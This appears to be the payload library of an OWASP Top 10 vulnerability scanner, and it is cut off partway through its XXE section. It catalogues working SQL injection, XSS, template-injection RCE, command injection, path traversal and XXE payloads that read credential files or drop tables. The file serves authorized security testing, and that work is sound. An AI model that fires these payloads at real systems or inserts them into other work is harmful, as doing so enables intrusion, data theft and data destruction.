"""
=============================================================================
  OWASP Top 10 Vulnerability Checker — payloads.py
=============================================================================
  Module   : Payload Library (OWASP 2021 Edition)
  Purpose  : Centralized, categorized library of detection payloads covering
             all OWASP Top 10 vulnerability classes (2021).
  Author   : OWASP Checker Framework
  License  : MIT (Authorized / Educational Use Only)

  ⚠️  DISCLAIMER
  ─────────────────────────────────────────────────────────────────────────
  FOR AUTHORIZED PENETRATION TESTING, CTF, AND EDUCATIONAL USE ONLY.
  Do NOT test against systems you do not own or have written permission
  to assess. Unauthorized use is illegal and unethical.
  ─────────────────────────────────────────────────────────────────────────
=============================================================================
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import List, Optional, Dict, Any


# ─────────────────────────────────────────────────────────────────────────────
# Enumerations
# ─────────────────────────────────────────────────────────────────────────────

class OWASPCategory(Enum):
    A01_BROKEN_ACCESS_CONTROL       = "A01:2021 – Broken Access Control"
    A02_CRYPTOGRAPHIC_FAILURES      = "A02:2021 – Cryptographic Failures"
    A03_INJECTION                   = "A03:2021 – Injection"
    A04_INSECURE_DESIGN             = "A04:2021 – Insecure Design"
    A05_SECURITY_MISCONFIGURATION   = "A05:2021 – Security Misconfiguration"
    A06_VULNERABLE_COMPONENTS       = "A06:2021 – Vulnerable and Outdated Components"
    A07_AUTH_FAILURES               = "A07:2021 – Identification and Authentication Failures"
    A08_DATA_INTEGRITY              = "A08:2021 – Software and Data Integrity Failures"
    A09_LOGGING_FAILURES            = "A09:2021 – Security Logging and Monitoring Failures"
    A10_SSRF                        = "A10:2021 – Server-Side Request Forgery"


class InjectionType(Enum):
    SQL_ERROR        = "SQL Injection (Error-Based)"
    SQL_BOOLEAN      = "SQL Injection (Boolean-Based)"
    SQL_TIME         = "SQL Injection (Time-Based Blind)"
    SQL_UNION        = "SQL Injection (UNION-Based)"
    XSS_REFLECTED    = "XSS (Reflected)"
    XSS_STORED       = "XSS (Stored)"
    XSS_DOM          = "XSS (DOM-Based)"
    SSTI             = "Server-Side Template Injection"
    CMD_INJECTION    = "Command Injection"
    PATH_TRAVERSAL   = "Path Traversal / LFI"
    XXE              = "XML External Entity (XXE)"
    OPEN_REDIRECT    = "Open Redirect"
    SSRF             = "Server-Side Request Forgery"
    IDOR             = "Insecure Direct Object Reference"
    HEADER_INJECTION = "HTTP Header Injection"


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"


# ─────────────────────────────────────────────────────────────────────────────
# Payload Data Class
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Payload:
    raw:            str
    owasp_category: OWASPCategory
    injection_type: InjectionType
    severity:       Severity              = Severity.HIGH
    expected:       Optional[str]         = None          # substring to look for
    expect_regex:   Optional[str]         = None          # regex to match
    time_based:     bool                  = False         # time-delay payload
    delay_secs:     float                 = 5.0           # expected min delay
    description:    str                   = ""
    tags:           List[str]             = field(default_factory=list)
    bypass:         bool                  = False         # WAF bypass variant
    engine:         Optional[str]         = None          # target engine/db

    def __str__(self) -> str:
        return self.raw


# ─────────────────────────────────────────────────────────────────────────────
# A03 — SQL INJECTION PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

SQL_ERROR_PAYLOADS: List[Payload] = [
    # ── Classic error-based ──────────────────────────────────────────────────
    Payload("'", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            expect_regex=r"(sql|syntax|mysql|ora-|sqlite|mssql|pg_|error|exception)",
            description="Single quote — triggers SQL syntax errors", engine="Generic"),
    Payload('"', OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            expect_regex=r"(sql|syntax|error|exception)",
            description="Double quote — triggers SQL syntax errors", engine="Generic"),
    Payload("'--", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Inline comment terminator", engine="MySQL/MSSQL"),
    Payload("'-- -", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Inline comment with space", engine="MySQL"),
    Payload("' OR '1'='1", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Classic OR 1=1 tautology", engine="Generic"),
    Payload("' OR '1'='1'--", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Tautology with comment", engine="MySQL/MSSQL"),
    Payload("' OR 1=1--", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Numeric tautology", engine="MySQL/MSSQL"),
    Payload("1' AND 1=2--", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="False condition to detect boolean behavior"),
    Payload("admin'--", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Username bypass attempt", engine="MySQL/MSSQL"),
    Payload("admin'#", OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Hash comment bypass (MySQL)", engine="MySQL"),
    # MySQL error-based
    Payload("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            expect_regex=r"XPATH syntax error", description="MySQL EXTRACTVALUE error injection",
            engine="MySQL"),
    Payload("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            expect_regex=r"XPATH syntax error", description="MySQL UPDATEXML error injection",
            engine="MySQL"),
    Payload("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x "
            "FROM information_schema.tables GROUP BY x)a)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="MySQL floor() error-based", engine="MySQL"),
    # MSSQL error-based
    Payload("' AND 1=CONVERT(int,@@VERSION)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            expect_regex=r"(Conversion failed|converting|varchar)", engine="MSSQL",
            description="MSSQL CONVERT error injection"),
    Payload("';SELECT 1/0--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            expect_regex=r"Divide by zero", engine="MSSQL",
            description="MSSQL divide by zero"),
    # Oracle error-based
    Payload("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Oracle error-based via CTXSYS", engine="Oracle"),
    Payload("' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||"
            "CHR(113)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(113))) FROM dual)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            description="Oracle XMLType error injection", engine="Oracle"),
    # PostgreSQL error-based
    Payload("' AND 1=CAST((SELECT version()) AS int)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_ERROR,
            expect_regex=r"(invalid input|integer|ERROR)", engine="PostgreSQL",
            description="PostgreSQL CAST error injection"),
]

SQL_BOOLEAN_PAYLOADS: List[Payload] = [
    Payload("' AND 1=1--", OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="Boolean TRUE condition"),
    Payload("' AND 1=2--", OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="Boolean FALSE condition"),
    Payload("' AND 'x'='x", OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="String TRUE condition"),
    Payload("' AND 'x'='y", OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="String FALSE condition"),
    Payload("1 AND 1=1", OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="Numeric TRUE"),
    Payload("1 AND 1=2", OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="Numeric FALSE"),
    Payload("1' AND SUBSTRING(VERSION(),1,1)='5'--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="MySQL version fingerprint via boolean", engine="MySQL"),
    Payload("1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="Character-by-character extraction (admin password)", engine="Generic"),
    Payload("1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="Table existence check", engine="MySQL/PostgreSQL"),
    Payload("1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_BOOLEAN,
            description="ASCII-based blind extraction", engine="MySQL"),
]

SQL_TIME_PAYLOADS: List[Payload] = [
    # MySQL
    Payload("' AND SLEEP(5)--", OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="MySQL",
            description="MySQL SLEEP() time-based blind"),
    Payload("1; SELECT SLEEP(5)--", OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="MySQL",
            description="Stacked query SLEEP"),
    Payload("' OR SLEEP(5)--", OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="MySQL"),
    Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="MySQL",
            description="Subquery SLEEP"),
    # MSSQL
    Payload("'; WAITFOR DELAY '0:0:5'--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="MSSQL",
            description="MSSQL WAITFOR DELAY"),
    Payload("1; WAITFOR DELAY '0:0:5'--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="MSSQL"),
    # PostgreSQL
    Payload("'; SELECT pg_sleep(5)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="PostgreSQL",
            description="PostgreSQL pg_sleep()"),
    Payload("1 AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="PostgreSQL"),
    # Oracle
    Payload("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),5)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=5, engine="Oracle",
            description="Oracle DBMS_PIPE time-based"),
    # SQLite
    Payload("' AND 1=randomblob(100000000)--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_TIME,
            time_based=True, delay_secs=3, engine="SQLite",
            description="SQLite heavy computation delay"),
]

SQL_UNION_PAYLOADS: List[Payload] = [
    Payload("' UNION SELECT NULL--", OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION column count detection (1 col)"),
    Payload("' UNION SELECT NULL,NULL--", OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION column count detection (2 col)"),
    Payload("' UNION SELECT NULL,NULL,NULL--", OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION column count detection (3 col)"),
    Payload("' UNION SELECT NULL,NULL,NULL,NULL--", OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION column count detection (4 col)"),
    Payload("' UNION SELECT 1,2,3--", OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION int column detection"),
    Payload("' UNION SELECT 'a','b','c'--", OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION string column detection"),
    Payload("' UNION SELECT table_name,NULL FROM information_schema.tables--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION information_schema dump", engine="MySQL/PostgreSQL"),
    Payload("' UNION SELECT username,password FROM users--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION users table dump attempt"),
    Payload("' UNION SELECT @@version,NULL--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION MySQL version", engine="MySQL/MSSQL"),
    Payload("' UNION SELECT user(),database()--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION current user and database", engine="MySQL"),
    Payload("' UNION SELECT NULL,NULL FROM dual--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            description="UNION Oracle dual table", engine="Oracle"),
    Payload("'; DROP TABLE users--",
            OWASPCategory.A03_INJECTION, InjectionType.SQL_UNION,
            severity=Severity.CRITICAL,
            description="Destructive stacked query (Bobby Tables)"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A03 — XSS PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

XSS_PAYLOADS: List[Payload] = [
    # ── Classic reflected ────────────────────────────────────────────────────
    Payload('<script>alert(1)</script>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            expected="<script>alert(1)</script>", description="Classic script alert"),
    Payload('<script>alert("XSS")</script>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            expected='alert("XSS")', description="Classic alert with string"),
    Payload('<script>alert(document.domain)</script>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Domain disclosure via alert"),
    Payload('<script>console.log(document.cookie)</script>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Cookie exfiltration via console"),
    Payload('"><script>alert(1)</script>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Break out of attribute context"),
    Payload("'><script>alert(1)</script>", OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Single quote break-out"),
    Payload('</title><script>alert(1)</script>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Break out of title tag"),
    Payload('</textarea><script>alert(1)</script>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Break out of textarea"),
    # ── Event-handler based ──────────────────────────────────────────────────
    Payload('<img src=x onerror=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="onerror handler on broken image"),
    Payload('<img src=x onerror="alert(document.cookie)">', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Cookie theft via onerror"),
    Payload('<svg onload=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="SVG onload event"),
    Payload('<body onload=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="body onload event"),
    Payload('<input autofocus onfocus=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="autofocus onfocus"),
    Payload('<select autofocus onfocus=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="select autofocus onfocus"),
    Payload('<details open ontoggle=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="details ontoggle"),
    Payload('<video src=x onerror=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="video onerror"),
    Payload('<audio src=x onerror=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="audio onerror"),
    Payload('<marquee onstart=alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="marquee onstart"),
    # ── WAF bypass variants ──────────────────────────────────────────────────
    Payload('<ScRiPt>alert(1)</ScRiPt>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="Mixed case bypass"),
    Payload('<script >alert(1)</script >', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="Space before > bypass"),
    Payload('<script/src=data:,alert(1)>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="data: URI script"),
    Payload('<img src=1 href=1 onerror="javascript:alert(1)">', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="javascript: URI onerror"),
    Payload('&#60;script&#62;alert(1)&#60;/script&#62;', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="HTML entity encoding"),
    Payload('%3Cscript%3Ealert(1)%3C/script%3E', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="URL encoded XSS"),
    Payload('<img src=`javascript:alert(1)`>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="Backtick attribute delimiter"),
    Payload('<iframe src="javascript:alert(1)"></iframe>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="iframe javascript: URI"),
    Payload('<a href="javascript:alert(1)">click</a>', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            description="Anchor javascript: URI"),
    Payload('"><img src=x onerror=confirm(1)//', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="confirm() to bypass alert filter"),
    Payload('"><svg/onload=prompt(1)//', OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="prompt() bypass"),
    # ── Angular / Template injection XSS ────────────────────────────────────
    Payload('{{constructor.constructor("alert(1)")()}}', OWASPCategory.A03_INJECTION, InjectionType.XSS_DOM,
            description="AngularJS sandbox escape", tags=["angular"]),
    Payload('{{7*7}}', OWASPCategory.A03_INJECTION, InjectionType.XSS_DOM,
            expected="49", description="Template expression test"),
    # ── Polyglot XSS ────────────────────────────────────────────────────────
    Payload("""jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>""",
            OWASPCategory.A03_INJECTION, InjectionType.XSS_REFLECTED,
            bypass=True, description="Ultimate XSS polyglot"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A03 — SSTI PAYLOADS (inherited from original framework)
# ─────────────────────────────────────────────────────────────────────────────

SSTI_PAYLOADS: List[Payload] = [
    # ── Polyglot detection ───────────────────────────────────────────────────
    Payload("{{7*7}}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="Jinja2/Twig arithmetic test", engine="Jinja2/Twig"),
    Payload("${7*7}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="FreeMarker/Mako arithmetic", engine="FreeMarker/Mako"),
    Payload("#{7*7}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="Ruby ERB arithmetic", engine="ERB"),
    Payload("<%= 7*7 %>", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="Ruby/ASP ERB output", engine="ERB/ASP"),
    Payload("{{7*'7'}}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="7777777", description="Jinja2 string multiplication", engine="Jinja2"),
    Payload("{{'7'*7}}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="7777777", description="Jinja2 string repetition"),
    Payload("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            severity=Severity.CRITICAL, description="FreeMarker RCE (id command)", engine="FreeMarker",
            expect_regex=r"(uid=|gid=|root|www-data)"),
    Payload("{{''.__class__.__mro__[2].__subclasses__()}}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expect_regex=r"<class '", description="Jinja2 subclasses dump", engine="Jinja2"),
    Payload("{{config}}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expect_regex=r"(SECRET_KEY|DEBUG|DATABASE)", description="Flask config disclosure", engine="Jinja2/Flask"),
    Payload("{{self}}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expect_regex=r"<TemplateReference", description="Jinja2 self object"),
    Payload("{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}"
            "{{c()._module.__builtins__['__import__']('os').system('id')}}{%endif%}{%endfor%}",
            OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            severity=Severity.CRITICAL, description="Jinja2 RCE via catch_warnings", engine="Jinja2"),
    Payload("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            severity=Severity.CRITICAL, description="FreeMarker assign+execute RCE", engine="FreeMarker"),
    Payload("{% set x = 'cat /etc/passwd' | system %}{{x}}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            severity=Severity.CRITICAL, description="Twig system filter RCE", engine="Twig"),
    Payload("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            severity=Severity.CRITICAL, description="Flask/Jinja2 globals RCE", engine="Jinja2"),
    Payload("#{7*7}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="Pebble / Velocity arithmetic", engine="Pebble"),
    Payload("*{7*7}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="Spring Expression Language (SpEL)", engine="Spring"),
    Payload("${7*7}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="Tornado/Mako expression", engine="Tornado/Mako"),
    Payload("@{7*7}", OWASPCategory.A03_INJECTION, InjectionType.SSTI,
            expected="49", description="Thymeleaf arithmetic", engine="Thymeleaf"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A03 — COMMAND INJECTION PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

CMD_INJECTION_PAYLOADS: List[Payload] = [
    # Linux
    Payload("; id", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", severity=Severity.CRITICAL, description="Semicolon command separator"),
    Payload("| id", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", severity=Severity.CRITICAL, description="Pipe command separator"),
    Payload("|| id", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", description="OR separator (runs on failure)"),
    Payload("&& id", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", description="AND separator (runs on success)"),
    Payload("`id`", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", description="Backtick subshell"),
    Payload("$(id)", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", description="$() subshell substitution"),
    Payload("; cat /etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"root:x:", severity=Severity.CRITICAL, description="passwd file read"),
    Payload("| cat /etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"root:x:", severity=Severity.CRITICAL),
    Payload("; whoami", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"(root|www-data|apache|nginx)", description="Current user disclosure"),
    Payload("; uname -a", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"(Linux|Darwin|GNU)", description="OS fingerprint"),
    Payload("; ls -la /", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"(bin|etc|usr)", description="Root directory listing"),
    Payload("; ping -c 1 127.0.0.1", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"(PING|bytes from)", description="ICMP ping (blind test)"),
    # Windows
    Payload("| dir", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"(Volume|Directory)", description="Windows dir listing"),
    Payload("& whoami", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"(SYSTEM|Administrator|NT)", description="Windows whoami"),
    Payload("| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"localhost", description="Windows hosts file"),
    # Blind time-based
    Payload("; sleep 5", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            time_based=True, delay_secs=5, description="Linux sleep (blind)", tags=["blind"]),
    Payload("| sleep 5", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            time_based=True, delay_secs=5),
    Payload("& ping -n 5 127.0.0.1", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            time_based=True, delay_secs=4, description="Windows ping delay (blind)"),
    # Bypass
    Payload(";i''d", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", bypass=True, description="Quote bypass for id"),
    Payload(";i$@d", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", bypass=True, description="Variable expansion bypass"),
    Payload("${IFS}id", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", bypass=True, description="IFS separator bypass"),
    Payload(";{id}", OWASPCategory.A03_INJECTION, InjectionType.CMD_INJECTION,
            expect_regex=r"uid=\d+", bypass=True, description="Brace command grouping"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A03 — PATH TRAVERSAL / LFI PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS: List[Payload] = [
    Payload("../../../etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", severity=Severity.CRITICAL, description="Linux passwd file (3 levels)"),
    Payload("../../../../etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", severity=Severity.CRITICAL),
    Payload("../../../../../etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:"),
    Payload("../../../../../../etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:"),
    Payload("../../../etc/shadow", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"\$[126y]\$", severity=Severity.CRITICAL, description="Shadow password file"),
    Payload("../../../etc/hosts", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expected="localhost", description="Hosts file"),
    Payload("../../../proc/version", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"Linux version", description="Linux kernel version"),
    Payload("../../../proc/self/environ", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"(PATH|HOME|USER)", description="Process environment variables"),
    Payload("../../../var/log/apache2/access.log", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"(GET|POST|HTTP)", description="Apache access log"),
    Payload("../../../var/log/nginx/access.log", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"(GET|POST|HTTP)", description="Nginx access log"),
    Payload("../../../windows/win.ini", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"\[fonts\]", description="Windows win.ini"),
    Payload("..\\..\\..\\windows\\win.ini", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"\[fonts\]", description="Windows backslash traversal"),
    # Encoded variants
    Payload("..%2F..%2F..%2Fetc%2Fpasswd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", bypass=True, description="URL encoded traversal"),
    Payload("..%252F..%252F..%252Fetc%252Fpasswd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", bypass=True, description="Double URL encoded traversal"),
    Payload("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", bypass=True, description="UTF-8 overlong encoding"),
    Payload("....//....//....//etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", bypass=True, description="Double dot-slash bypass"),
    Payload("/etc/passwd%00", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", bypass=True, description="Null byte extension bypass"),
    Payload("php://filter/convert.base64-encode/resource=/etc/passwd",
            OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"[A-Za-z0-9+/]{20}", description="PHP filter wrapper (base64)"),
    Payload("php://filter/read=string.rot13/resource=index.php",
            OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            description="PHP filter ROT13 wrapper"),
    Payload("file:///etc/passwd", OWASPCategory.A03_INJECTION, InjectionType.PATH_TRAVERSAL,
            expect_regex=r"root:x:", description="File URI scheme"),
]

# ─────────────────────────────────────────────────────────────────────────────
# A03 — XXE PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

XXE_PAYLOADS: List[Payload] = [
    Payload("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            expect_regex=r"root:x:", severity=Severity.CRITICAL,
            description="Classic XXE - /etc/passwd"),
    Payload("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root><data>&xxe;</data></root>""",
            OWASPCategory.A03_INJECTION, InjectionType.XXE,
            expected="localhost", description="XXE - /etc/hosts"),
    Payload("""<?xml version="1.0" encoding="UTF-8"?>
